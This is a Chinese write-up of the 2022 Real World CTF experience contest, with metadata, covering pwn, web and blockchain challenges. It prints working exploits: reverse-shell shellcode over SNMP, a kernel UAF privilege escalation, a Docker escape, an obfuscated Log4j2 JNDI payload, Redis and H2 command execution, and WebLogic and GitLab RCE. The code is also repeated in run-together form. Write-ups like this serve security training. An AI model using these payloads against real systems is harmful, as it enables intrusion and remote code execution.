---
title: 赛题全解|第四届 RWCTF 体验赛 WriteUp
contest: 第四届 Real World CTF 体验赛
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags:
- Java-Processor
- Annotation-Processing
- SNMP-aarch64
- kernel-UAF
- Docker-escape
- lvm-vm
- CAP_DAC_OVERRIDE
- QEMU-RTOS
- Log4j-JNDI
- Redis-unauth
- H2-Database
- phpMyAdmin
- Pentest-Pivoting
attack_chain:
- 'Secured Java: 扩展javax.annotation.processing.AbstractProcessor+读取flag+打包为jar(META-INF/services)+远程发送'
- 'Remote Debugger: 39支战队解出(简单Java JDWP调试)'
- 'Be-an-IoT-Hacker: SNMP SET OID 1.3.6.1.4.1.23333.1.0写入aarch64 shellcode+反弹shell'
- 'Digging into Kernel: kmem_cache_create("lalala", 192, 0, 0, 0)+xkmod_ioctl三命令(alloc/rd/wt)+fork子进程+UAF改cred.uid=0提权'
- 'Be-a-Docker-Escaper: docker -m 128m挂载docker.sock+privileged+挂载/dev/sda1读宿主机flag'
- 'Be-a-VM-Escaper: 自定义lvm VM(PUSH/POP/ADD/SUB/IFEQ/JMP等)+libc-2.31栈地址计算+ret+system(/bin/sh)'
- 'Phonograph: CAP_DAC_OVERRIDE capability读/records+CVE-2016-1247 /etc/ld.so.preload提权'
- 'the REAL Menu Challenge: QEMU vexpress-a9 + 0x600104D0栈溢出+shellcode(ldr r0 flag; ldr pc puts)'
- '1log4flag: Log4j2 RCE+${j${::-n}di:${::-l}dap://...}绕字符串检查+su18/JNDI工具'
- '2Be-a-Database-Hacker: Redis未授权+写公钥或定时任务反弹+H2数据库CREATE ALIAS SHELLEXEC执行whoami'
key_payload: Log4j2 ${j${::-n}di:ldap://} + H2 CREATE ALIAS SHELLEXEC
one_liner: 第四届Real World CTF体验赛赛题全解,涵盖Java Processor注解处理+SNMP aarch64 PWN+kernel UAF+Docker逃逸+lvm VM+CAP_DAC_OVERRIDE+Log4j JNDI+Redis+H2 RCE。
lesson: Real World CTF体验赛质量顶级,涵盖IOT/内核/容器/VM/CAP/JNDI/Redis/H2等真实场景;Log4j2字符串绕过${j${::-n}di:${::-l}dap}是2022热点;H2数据库CREATE ALIAS是Web Java常见反序列化路径。
quality: high
full_path: 赛题全解-第四届_RWCTF_体验赛_WriteUp.full.md
meta_path: 赛题全解-第四届_RWCTF_体验赛_WriteUp.meta.md
images_removed: true
images_removed_count: 8
schema_version: v3.0.0-P0
summary: '赛题全解|第四届 RWCTF 体验赛 WriteUp。第四届Real World CTF体验赛赛题全解,涵盖Java Processor注解处理+SNMP aarch64 PWN+kernel UAF+Docker逃逸+lvm VM+CAP_DAC_OVERRIDE+Log4j JNDI+Redis+H2 RCE。。关键路径：Secured Java: 扩展javax.annotation....'
category: pwn
subcategory: pwn_other
tools_used:
- Java
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 8
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/24814.html
reasoning_chain:
- Real World CTF 体验赛涵盖 9 大类题 → 触发点：高质量综合题集（Java/SNMP/Kernel/Docker/VM/CAP/Log4j/Redis/H2）
- Secured Java：javax.annotation.processing.AbstractProcessor + 读 flag + 打包 jar META-INF/services + 远程发
- Be-an-IoT-Hacker：SNMP SET OID 1.3.6.1.4.1.23333.1.0 写入 aarch64 shellcode + 反弹 shell
- Digging into Kernel：kmem_cache_create('lalala', 192, 0, 0, 0) + xkmod_ioctl 三命令 (alloc/rd/wt) + fork + UAF 改 cred.uid=0 提权
- Be-a-Docker-Escaper：docker -m 128m 挂载 docker.sock + privileged + 挂 /dev/sda1 读宿主机 flag
- Be-a-VM-Escaper：自定义 lvm VM (PUSH/POP/ADD/SUB/IFEQ/JMP) + libc-2.31 栈地址计算 + ret + system(/bin/sh)
- Phonograph：CAP_DAC_OVERRIDE capability 读 /records + CVE-2016-1247 /etc/ld.so.preload 提权
- REAL Menu Challenge：QEMU vexpress-a9 + 0x600104D0 栈溢出 + shellcode (ldr r0 flag; ldr pc puts)
- 1log4flag：Log4j2 RCE + ${j${::-n}di:${::-l}dap://...} 绕字符串检查 + su18/JNDI 工具
- 2Be-a-Database-Hacker：Redis 未授权 + 写公钥或定时任务反弹 + H2 数据库 CREATE ALIAS SHELLEXEC 执行 whoami
failed_attempts:
- 试图用普通 Log4j payload ${jndi:ldap://...} → 失败：字符串黑名单过滤
- 试图不挂 docker.sock 直接读宿主机 → 失败：容器隔离
- 试图用 Redis 主从复制拿 shell → 失败：环境是单实例 Redis 未启用主从
key_observations:
- Real World CTF 体验赛质量顶级，涵盖 IoT/内核/容器/VM/CAP/JNDI/Redis/H2 等真实场景
- Log4j2 字符串绕过 ${j${::-n}di:${::-l}dap} 是 2022 热点，需多层嵌套
- H2 数据库 CREATE ALIAS SHELLEXEC 是 Web Java 常见反序列化路径
- kernel UAF 通过 fork 子进程保留对已释放 cred 的引用是提权经典手法
prerequisites:
- Java Annotation Processing / SPI 机制
- SNMP 协议 OID 操作
- Linux kernel UAF + cred 结构
- Log4j2 JNDI 漏洞利用链
---
# 赛题全解|第四届 RWCTF 体验赛 WriteUp

> 原文: https://www.ctfiot.com/24814.html
> ID: 24814

1月22日-23日，第四届Real World CTF举办的同期，一场特别面向高校和企业的CTF体验赛也激战正酣，202支队伍、来自企业和高校的近千人参赛，16次一血，有效flag提交699次，正赛同类型题目，完全结合真实场景的网络攻防对抗，紧张精彩程度丝毫不逊色。

对于高校与企业来说，以赛代练，以赛促研、产教融合，是提升未来安全人才网络实战能力，培养实战“尖兵”的重要形式。以知识传递和助力成长为目的，对于本次体验赛所有题目的 Writeup 进行公开，以飨众网安爱好者。

Pwn

01

Secured Java

该赛题比赛期间共有0支战队解出

实现一个扩展 javax.annotation.processing.AbstractProcessor 的类，在处理函数或 static 中读取 flag 输出

打包为一个符合要求的 jar （为了能自动加载上一步实现的 Processor，需要把类名加入到 META-INF/services/javax.annotation.processing.Processor 中）

将 Java 源码文件和 jar 文件发送到远程服务，获取 flag

02

Remote Debugger

该赛题比赛期间共有39支战队解出

03

Be-an-IoT-Hacker

该赛题比赛期间共有0支战队解出

#!/usr/bin/env python
# -*- coding: utf-8 -*-#coding=utf-8from http.client import PAYMENT_REQUIRED
from os import O_ASYNC
from easysnmp import snmp_get,snmp_setimport struct
from pwn import cyclic
from pwn import p64
from pwn import asm
from pwn import shellcraft
from pwn import context
context.arch = "aarch64"
HOST = ""PORT = 161LHOST = ""OID = "1.3.6.1.4.1.23333.1.0"
payload = b""payload += p64(0x4DE400)*(136//8)payload += p64(0xdeadbeef)payload += p64(0x493F88)payload += p64(0x589088)*8
payload += p64(0)payload += p64(0x493F68)payload += p64(0)payload += p64(0x589000)payload += p64(0x1000)payload += p64(0x7)payload += p64(1)payload += p64(0x589088)
payload += p64(0)payload += p64(0x5891c8)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)

payload += asm(shellcraft.connect(LHOST,4444,'ipv4'))payload += asm(shellcraft.cat("/flag", fd=7))
snmp_set(OID,payload.decode("latin"),type="OCTETSTR",hostname=HOST,remote_port=PORT,community="public",version=2)

04

Digging into Kernel

该赛题比赛期间共有22支战队解出

int __cdecl xkmod_init(){ kmem_cache *v0; // rax
 printk(&unk_1E4); misc_register(&xkmod_device); v0 = (kmem_cache *)kmem_cache_create("lalala", 192LL, 0LL, 0LL, 0LL); buf = 0LL; s = v0; return 0;}

__int64 __fastcall xkmod_ioctl(__int64 fd, int cmd, void *value){ __int64 v4; // [rsp+0h] [rbp-20h] BYREF unsigned int v5; // [rsp+8h] [rbp-18h] unsigned int v6; // [rsp+Ch] [rbp-14h] unsigned __int64 v7; // [rsp+10h] [rbp-10h]
 v7 = __readgsqword(0x28u); if ( !value ) return 0LL; copy_from_user(&v4, value, 16LL); if ( cmd == 107374182 ) { if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_from_user((char *)buf + (int)v5, v4, (int)v6); return 0LL; } } else { if ( cmd != 125269879 ) { if ( cmd == 17895697 ) buf = (void *)kmem_cache_alloc(s, 3264LL); return 0LL; } if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_to_user(v4, (char *)buf + (int)v5); return 0LL; } } return xkmod_ioctl_cold();}

通过xkmod_ioctl申请一个堆块

释放该堆块

fork一个进程，新进程会申请刚刚释放的堆块存放cred

通过UAF修改子进程的cred，将uid、gid等置为0，完成提权

#include <stdio.h>#include <sys/types.h>#include <sys/io.h>#include <sys/ioctl.h>#include <fcntl.h>#include #include <stdlib.h>#include <string.h>#include <wait.h>
struct param{ void *as; int start; int len;};
struct param *p;
void alloc(int fd){ ioctl(fd, 0x1111111, p);}
void rd(int fd){ ioctl(fd, 0x7777777, p);}
void wt(int fd){ ioctl(fd, 0x6666666, p);}
int main(int argc, char const *argv[]){ int fd = open("/dev/xkmod", O_RDONLY); if (fd < 0) { puts("[*]open error!"); exit(0); } puts("[*]alloc from cache");
 p = malloc(sizeof(struct param)); p->as = malloc(0x100); alloc(fd); close(fd);
 int pid = fork(); if (pid < 0) { puts("[*]fork error!"); exit(0); } if (pid == 0) { puts("[*]this is child process!"); fd = open("/dev/xkmod", O_RDONLY); memset(p->as, 0, sizeof(p->as)); p->start = 0; p->len = 0x28; wt(fd); system("/bin/sh"); exit(0); } else { puts("[*]this is child process!"); int status; wait(&status); }
 return 0;}

05

Be-a-Docker-Escaper

该赛题比赛期间共有16支战队解出

docker run -i -m 128m -v /var/run/docker.sock:/s

sed -i "s/http://archive.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listsed -i "s/http://security.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listapt updateDEBIAN_FRONTEND="noninteractive" apt-get -y install docker.iodocker -H unix:///s run -i --privileged ubuntu bashmkdir /tmp/amount /dev/sda1 /tmp/achmod 777 /tmp/a/root/flagcat /tmp/a/root/flag

06

Be-a-VM-Escaper

该赛题比赛期间共有5支战队解出

enum impl_instr { NOP = 0, /* no-op */
 /* Registers/stack */ PUSH, /* push a constant */ POP, /* pop from stack */ POPS, /* pop from the stack into register no. (argument) */ STORE, /* save to register no. (argument) */ LOAD, /* push from register no. (argument) */
 /* Arithmetic */ /* pop twice, do operation then push */ ADD, SUB, MUL, DIV, REM, /* remainder */
 /* Bitwise operators */ /* pop, do operation, then push */ NOT, AND, /* pop twice */ OR, /* pop twice */ XOR, /* pop twice */ LSHFT, /* pop once, shift popped by arg */ RSHFT, /* pop once, shift popped by arg */
 /* Flow control */ JMP, /* jump to line arg */ IFEQ, /* pop twice, jump to line arg if equal */ IFNEQ, IFZ, /* pop once, jump to line arg if zero */ IFNZ,
 /* I/O */ PRINT, /* print top of stack */ PRINC, POPP, /* print top of stack and pop */ POPPC,
 DONE};

#define CHECK_REG(x) if (x > REGNO) { fprintf(stderr, "INVALID REGISTER: ABORTn"); exit(1); }

from pwn import *
p = process("./lvm")libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
def nop(): p.sendline(b"0")
def push(value): p.sendline(b"1") p.sendline(str(value).encode("latin"))
def pop(): p.senline(b"2")
def pops(reg): p.sendline(b"3") p.sendline(str(reg).encode("latin"))
def store(reg): p.sendline(b"4") p.sendline(str(reg).encode("latin"))
def load(reg): p.sendline(b"5") p.sendline(str(reg).encode("latin"))
def add(): p.sendline(b"6")
def sub(): p.sendline(b"7")
def mul(): p.sendline(b"8")
def div(): p.sendline(b"9")
def jmp(value): p.sendline(b"17") p.sendline(str(value).encode("latin"))
def done(): p.sendline(b"26")
p.sendline(b"28")
# pause()
load(-40)push(0x1120)sub()store(0) # proc_base
load(-27)push(0x13900)sub()store(1)
load(-35)push(0x662e2)sub()store(2) # libc_base
# 0x000000000000101a: ret;# 0x0000000000002483: pop rdi; ret;
load(0)push(0x101a)add()store(-0x2000000000000000 + 0x9C61)
load(0)push(0x2483)add()store(-0x2000000000000000 + 0x9C62)
load(2)push(libc.search(b"/bin/sh").__next__())add()store(-0x2000000000000000 + 0x9C63)
load(2)push(libc.symbols["system"])add()store(-0x2000000000000000 + 0x9C64)
# load(-0x2000000000000000 + 0x9C61)
# pause()
p.interactive()

07

Phonograph

该赛题比赛期间共有2支战队解出

题目名称以及题目描述均提示了选手需要关注phonograph这个程序。经过尝试可以发现低权限用户可以通过phonograph读取/records中的文件，进一步调查可以发现/usr/local/bin/phonograph程序有CAP_DAC_OVERRIDE的capability。而CAP_DAC_OVERRIDE除了可以无视DAC读取文件外，还可以无视DAC的限制写文件。

通过file spray在/tmp目录下准备好软链接即可以实现任意文件写。后续可以参考CVE-2016-1247的利用手段，写/etc/ld.so.preload实现提权。

08

the REAL Menu Challenge

该赛题比赛期间共有1支战队解出

注意到位于地址0x600104D0处的函数存在栈溢出。直接ROP调用puts输出flag即可

import pwn
pwn.context.log_level = "debug"

p = pwn.process("qemu-system-arm -m 64 -nographic -machine vexpress-a9 -monitor null -kernel ./rtos.bin" ,shell=True)
p.recvuntil("change screen img")
flag_addr = 0x60022E60puts_adddr = 0x60020698
shellcode = ''shellcode += "ldr r0, =0x60022E60n"shellcode += "ldr pc, =0x60020698n"
shellcode = pwn.asm(shellcode, arch="arm")
p.sendline(b'a'*0x14 + pwn.p32(0x6045a518) + shellcode)
p.interactive()

Web

1log4flag

该赛题比赛期间共有72支战队解出

通过源码审计知道存在 Log4j2 远程代码执行漏洞，但是对一些关键字符串有检查，用 log4j2 子串解析的特性进行绕过：

POST /doLogin HTTP/1.1Host: 47.102.135.31:
38178Content-Length: 68Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.102.135.31:
38178Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.102.135.31:
38178/login.htmlAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=C0AA8E4BF2CD55850E48239DB2EB00EDConnection: close
username=${j${::-n}di:${::-l}dap://your_server:
1234/a}&password=b

然后可以借助 https://github.com/su18/JNDI 这个工具完成 JNDI 注入的利用 RCE，拿到 /flag。

2Be-a-Database-Hacker

该赛题比赛期间共有71支战队解出

访问题目地址发现存在redis未授权访问，我们可以将任意文件写入到目标Redis权限下的任意路径，然后获得反弹shell。参考项目：https://github.com/0671/RabR

获取反弹shell

python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -p 6379

cat /tmp/flag.txt

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;

执行whoami命令

CALL SHELLEXEC('whoami')

读取flag

CALL SHELLEXEC('cat /root/flag.txt')

3the Secrets of Memory

该赛题比赛期间共有68支战队解出

1、访问目标地址，页面返回Hello Actuator!!，或者访问目标的任意url，返回Whitelabel Error Page

MAT工具下载链接（https://www.eclipse.org/mat/）。

4baby flaglab

该赛题比赛期间共有65支战队解出

1、注册账号访问help能查看版本（版本号为：13.10.1），发现存在CVE-2021-22205 exiftool rce，参考脚本：https://github.com/Al1ex/CVE-2021-22205

2、wget一个反弹shell脚本到当前目录，然后获得反弹 shell

python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "sh 1.sh"

3、读取flag

cat /tmp/flag.txt

5Ghost Shiro

该赛题比赛期间共有35支战队解出

题目中给出了service端口和AJP端口，首先利用ghostcat在AJP端口读取WEB-INF/shiro.ini文件。参考工具:
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

securityManager.rememberMeManager.cipherKey = ODN6dDZxNzh5ejB6YTRseg==

读取到密钥为ODN6dDZxNzh5ejB6YTRseg==

得到密钥之后就可以在service端口利用shiro反序列化进行命令执行来读取flag。参考工具:
https://github.com/SummerSec/ShiroAttack2

6Flag Console

该赛题比赛期间共有61支战队解出

由于 WebLogic 前通过 Nginx 做 HTTP 反代转发，所以 T3，IIOP 协议不可用。而有漏洞的 HTTP 组件还剩下 Console。因此通过 WebLogic Console 远程代码执行漏洞进行利用：

http://your-ip:
7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")

<?xml version="1.0" encoding="UTF-8" ?>  <constructor-arg> <list> <value>bash</value> <value>-c</value> <value><![CDATA[touch /tmp/success2]]></value> </list> </constructor-arg> 

7Java Remote Debugger

该赛题比赛期间共有50支战队解出

题目中给出了java远程调试端口，可直接远程连接该端口执行命令。参考工具：https://github.com/IOActive/jdwp-shellifier，利用工具反弹shell，然后读取flag即可。

需要注意的点是由于java提供的命令执行环境，不支持管道符、输入输出重定向等，所以常规的反弹shell命令需要先base64编码一下才能执行成功

在线编码地址https://www.jackson-t.ca/runtime-exec-payloads.html

Blockchain

1

TransferFrom

该赛题比赛期间共有7支战队解出

漏洞分析

根据题目描述，我们需要让主合约的isSolved()函数返回True，才能拿到Flag。

跟进_transfer函数：

问题出现在了254行，ERC20合约的转账操作 被定义为 转出者余额减少，转入者余额增加。但如图所示，合约并没有检查转出者的余额是否足够减少。这边产生了漏洞。即使from账户没有钱，也可以向任意账户转账。

好~知道了合约漏洞出现在哪里，现在我们来利用这个漏洞来盗取101个fishmenToken

直接部署该合约即可获得101个鱼人币。

点分享

点收藏

点点赞

点在看


```
#!/usr/bin/env python
# -*- coding: utf-8 -*-#coding=utf-8from http.client import PAYMENT_REQUIRED
from os import O_ASYNC
from easysnmp import snmp_get,snmp_setimport struct
from pwn import cyclic
from pwn import p64
from pwn import asm
from pwn import shellcraft
from pwn import context
context.arch = "aarch64"
HOST = ""PORT = 161LHOST = ""OID = "1.3.6.1.4.1.23333.1.0"
payload = b""payload += p64(0x4DE400)*(136//8)payload += p64(0xdeadbeef)payload += p64(0x493F88)payload += p64(0x589088)*8
payload += p64(0)payload += p64(0x493F68)payload += p64(0)payload += p64(0x589000)payload += p64(0x1000)payload += p64(0x7)payload += p64(1)payload += p64(0x589088)
payload += p64(0)payload += p64(0x5891c8)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)

payload += asm(shellcraft.connect(LHOST,4444,'ipv4'))payload += asm(shellcraft.cat("/flag", fd=7))
snmp_set(OID,payload.decode("latin"),type="OCTETSTR",hostname=HOST,remote_port=PORT,community="public",version=2)
int __cdecl xkmod_init(){ kmem_cache *v0; // rax
 printk(&unk_1E4); misc_register(&xkmod_device); v0 = (kmem_cache *)kmem_cache_create("lalala", 192LL, 0LL, 0LL, 0LL); buf = 0LL; s = v0; return 0;}
__int64 __fastcall xkmod_ioctl(__int64 fd, int cmd, void *value){ __int64 v4; // [rsp+0h] [rbp-20h] BYREF unsigned int v5; // [rsp+8h] [rbp-18h] unsigned int v6; // [rsp+Ch] [rbp-14h] unsigned __int64 v7; // [rsp+10h] [rbp-10h]
 v7 = __readgsqword(0x28u); if ( !value ) return 0LL; copy_from_user(&v4, value, 16LL); if ( cmd == 107374182 ) { if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_from_user((char *)buf + (int)v5, v4, (int)v6); return 0LL; } } else { if ( cmd != 125269879 ) { if ( cmd == 17895697 ) buf = (void *)kmem_cache_alloc(s, 3264LL); return 0LL; } if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_to_user(v4, (char *)buf + (int)v5); return 0LL; } } return xkmod_ioctl_cold();}
    #include <stdio.h>#include <sys/types.h>#include <sys/io.h>#include <sys/ioctl.h>#include <fcntl.h>#include #include <stdlib.h>#include <string.h>#include <wait.h>
struct param{ void *as; int start; int len;};
struct param *p;
void alloc(int fd){ ioctl(fd, 0x1111111, p);}
void rd(int fd){ ioctl(fd, 0x7777777, p);}
void wt(int fd){ ioctl(fd, 0x6666666, p);}
int main(int argc, char const *argv[]){ int fd = open("/dev/xkmod", O_RDONLY); if (fd < 0) { puts("[*]open error!"); exit(0); } puts("[*]alloc from cache");
 p = malloc(sizeof(struct param)); p->as = malloc(0x100); alloc(fd); close(fd);
 int pid = fork(); if (pid < 0) { puts("[*]fork error!"); exit(0); } if (pid == 0) { puts("[*]this is child process!"); fd = open("/dev/xkmod", O_RDONLY); memset(p->as, 0, sizeof(p->as)); p->start = 0; p->len = 0x28; wt(fd); system("/bin/sh"); exit(0); } else { puts("[*]this is child process!"); int status; wait(&status); }
 return 0;}
docker run -i -m 128m -v /var/run/docker.sock:/s
sed -i "s/http://archive.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listsed -i "s/http://security.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listapt updateDEBIAN_FRONTEND="noninteractive" apt-get -y install docker.iodocker -H unix:///s run -i --privileged ubuntu bashmkdir /tmp/amount /dev/sda1 /tmp/achmod 777 /tmp/a/root/flagcat /tmp/a/root/flag
enum impl_instr { NOP = 0, /* no-op */
 /* Registers/stack */ PUSH, /* push a constant */ POP, /* pop from stack */ POPS, /* pop from the stack into register no. (argument) */ STORE, /* save to register no. (argument) */ LOAD, /* push from register no. (argument) */
 /* Arithmetic */ /* pop twice, do operation then push */ ADD, SUB, MUL, DIV, REM, /* remainder */
 /* Bitwise operators */ /* pop, do operation, then push */ NOT, AND, /* pop twice */ OR, /* pop twice */ XOR, /* pop twice */ LSHFT, /* pop once, shift popped by arg */ RSHFT, /* pop once, shift popped by arg */
 /* Flow control */ JMP, /* jump to line arg */ IFEQ, /* pop twice, jump to line arg if equal */ IFNEQ, IFZ, /* pop once, jump to line arg if zero */ IFNZ,
 /* I/O */ PRINT, /* print top of stack */ PRINC, POPP, /* print top of stack and pop */ POPPC,
 DONE};
    #define CHECK_REG(x) if (x > REGNO) { fprintf(stderr, "INVALID REGISTER: ABORTn"); exit(1); }
from pwn import *
p = process("./lvm")libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
def nop(): p.sendline(b"0")
def push(value): p.sendline(b"1") p.sendline(str(value).encode("latin"))
def pop(): p.senline(b"2")
def pops(reg): p.sendline(b"3") p.sendline(str(reg).encode("latin"))
def store(reg): p.sendline(b"4") p.sendline(str(reg).encode("latin"))
def load(reg): p.sendline(b"5") p.sendline(str(reg).encode("latin"))
def add(): p.sendline(b"6")
def sub(): p.sendline(b"7")
def mul(): p.sendline(b"8")
def div(): p.sendline(b"9")
def jmp(value): p.sendline(b"17") p.sendline(str(value).encode("latin"))
def done(): p.sendline(b"26")
p.sendline(b"28")
# pause()
load(-40)push(0x1120)sub()store(0) # proc_base
load(-27)push(0x13900)sub()store(1)
load(-35)push(0x662e2)sub()store(2) # libc_base
# 0x000000000000101a: ret;# 0x0000000000002483: pop rdi; ret;
load(0)push(0x101a)add()store(-0x2000000000000000 + 0x9C61)
load(0)push(0x2483)add()store(-0x2000000000000000 + 0x9C62)
load(2)push(libc.search(b"/bin/sh").__next__())add()store(-0x2000000000000000 + 0x9C63)
load(2)push(libc.symbols["system"])add()store(-0x2000000000000000 + 0x9C64)
# load(-0x2000000000000000 + 0x9C61)
# pause()
p.interactive()
import pwn
pwn.context.log_level = "debug"

p = pwn.process("qemu-system-arm -m 64 -nographic -machine vexpress-a9 -monitor null -kernel ./rtos.bin" ,shell=True)
p.recvuntil("change screen img")
flag_addr = 0x60022E60puts_adddr = 0x60020698
shellcode = ''shellcode += "ldr r0, =0x60022E60n"shellcode += "ldr pc, =0x60020698n"
shellcode = pwn.asm(shellcode, arch="arm")
p.sendline(b'a'*0x14 + pwn.p32(0x6045a518) + shellcode)
p.interactive()
POST /doLogin HTTP/1.1Host: 47.102.135.31:
38178Content-Length: 68Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.102.135.31:
38178Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.102.135.31:
38178/login.htmlAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=C0AA8E4BF2CD55850E48239DB2EB00EDConnection: close
username=${j${::-n}di:${::-l}dap://your_server:
1234/a}&password=b
python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -p 6379
cat /tmp/flag.txt
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
CALL SHELLEXEC('whoami')
CALL SHELLEXEC('cat /root/flag.txt')
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "sh 1.sh"
cat /tmp/flag.txt
securityManager.rememberMeManager.cipherKey = ODN6dDZxNzh5ejB6YTRseg==
http://your-ip:
7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
<?xml version="1.0" encoding="UTF-8" ?>  <constructor-arg> <list> <value>bash</value> <value>-c</value> <value><![CDATA[touch /tmp/success2]]></value> </list> </constructor-arg> 
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]